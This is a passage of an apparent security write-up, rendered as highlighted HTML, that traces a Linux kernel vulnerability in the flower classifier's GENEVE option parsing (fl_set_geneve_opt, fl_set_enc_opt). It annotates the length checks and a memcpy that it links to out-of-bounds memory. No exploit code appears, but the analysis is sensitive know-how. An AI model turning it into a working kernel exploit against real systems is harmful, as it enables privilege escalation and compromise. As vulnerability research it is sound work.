IP_TUNNEL_OPTS_MAX);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (new_len \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> FLOW_DIS_TUN_OPTS_MAX) {\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Tunnel options exceeds max size\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ERANGE;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt->length \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len \u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tmemcpy\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opt->opt_data, \u003C/span>\u003Cspan style=\"color:#B392F0\">nla_data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(data), data_len);\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">7\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS]) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tclass \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt->opt_class \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_get_be16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(class);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE]) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\ttype \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt->type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_get_u8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(type);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>At position [1], the function \u003Ccode>fl_set_geneve_opt()\u003C/code> directly uses \u003Ccode>key->enc_opts.len\u003C/code> as an array parameter, retrieving the \u003Ccode>opt\u003C/code> structure from the \u003Ccode>key->enc_opts.data\u003C/code> array, and setting the data of length \u003Ccode>option_len\u003C/code> to 0xff. Additionally, some fields of the \u003Ccode>opt\u003C/code> structure are initialized. Upon examining the \u003Ccode>struct geneve_opt\u003C/code> structure of \u003Ccode>opt\u003C/code>, it is evident that initializing the \u003Ccode>geneve_opt\u003C/code> structure requires exactly 4 bytes.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t__be16\topt_class;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\ttype;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">#ifdef\u003C/span>\u003Cspan style=\"color:#B392F0\"> __LITTLE_ENDIAN_BITFIELD\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tlength:\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tr3:\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tr2:\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tr1:\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">#else\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tr1:\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tr2:\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tr3:\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\tlength:\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">#endif\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu8\topt_data\u003C/span>\u003Cspan style=\"color:#F97583\">[]\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Continuing to position [2], the function parses the user-provided packet data into the \u003Ccode>tb\u003C/code> array. Additionally, due to the set \u003Ccode>geneve_opt_policy\u003C/code>, if data of type TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA is passed in (parsed at position [3]), it must not exceed 128 bytes.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> const\u003C/span>\u003Cspan style=\"color:#F97583\"> struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nla_policy\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#FFAB70\">geneve_opt_policy\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS]      \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> { .type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> NLA_U16 },\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE]       \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> { .type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> NLA_U8 },\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA]       \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> { .type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> NLA_BINARY,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t\t       .len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 128\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> },\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Here we arrive at position [3]. We can observe that the variable \u003Ccode>key->enc_opts.len\u003C/code>, used for the array, is assigned to \u003Ccode>new_len\u003C/code>. Since \u003Ccode>tb\u003C/code> is user-supplied data, positions [4] and [5] are used to ensure that the data we pass in is divisible by 4 and greater than the packet header, i.e., the \u003Ccode>struct geneve_opt\u003C/code> structure. Then, at position [6], the code checks whether the length of \u003Ccode>key->enc_opts.len\u003C/code> plus the length of our newly passed packet data is less than 255, which is the size of the \u003Ccode>key->enc_opts.data\u003C/code> array. After this series of validations, the data is finally copied to the \u003Ccode>opt_data\u003C/code> field of \u003Ccode>geneve_opt\u003C/code> using \u003Ccode>memcpy\u003C/code> at position [7]. In the end, \u003Ccode>fl_set_geneve_opt\u003C/code> will return the length of the new packet header plus the length of the data.\u003C/p>\n\u003Cp>Now, lets see how \u003Ccode>key->enc_opts.len\u003C/code> is assigned.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_set_enc_opt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">key\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t  struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">mask\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t  struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> netlink_ext_ack \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">extack\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPTS_MASK]) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_validate_nested_deprecated\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPTS_MASK],\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t\t     TCA_FLOWER_KEY_ENC_OPTS_MAX,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t\t     enc_opts_policy, extack);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tnla_opt_msk \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPTS_MASK]);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tmsk_depth \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPTS_MASK]);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_ok\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla_opt_msk, msk_depth)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Invalid nested attribute for masks\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tnla_for_each_attr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla_opt_key, nla_enc_key,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\t  nla_len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPTS]), key_depth) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tswitch\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_type\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla_opt_key)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tcase\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TCA_FLOWER_KEY_ENC_OPTS_GENEVE:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (key\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">enc_opts.dst_opt_type \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t    key\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">enc_opts.dst_opt_type \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TUNNEL_GENEVE_OPT) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Duplicate type for geneve options\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\toption_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tkey->enc_opts.dst_opt_type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TUNNEL_GENEVE_OPT;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\toption_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_set_geneve_opt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla_opt_key, key,\t\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t\t       key_depth, option_len,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t\t       extack);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (option_len \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> option_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tkey->enc_opts.len \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> option_len;\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t\t\t/* At the same time we need to parse through the mask\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t\t\t * in order to verify exact and mask attribute lengths.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t\t\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tmask->enc_opts.dst_opt_type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TUNNEL_GENEVE_OPT;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\toption_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_set_geneve_opt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla_opt_msk, mask,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t\t       msk_depth, option_len,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t\t       extack);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (option_len \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> option_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tmask->enc_opts.len \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> option_len;\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (key\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">enc_opts.len \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mask\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">enc_opts.len) {\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">10\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Key and mask miss aligned\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tbreak\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">msk_depth)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tcontinue\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_ok\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla_opt_msk, msk_depth)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"A mask attribute is invalid\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan 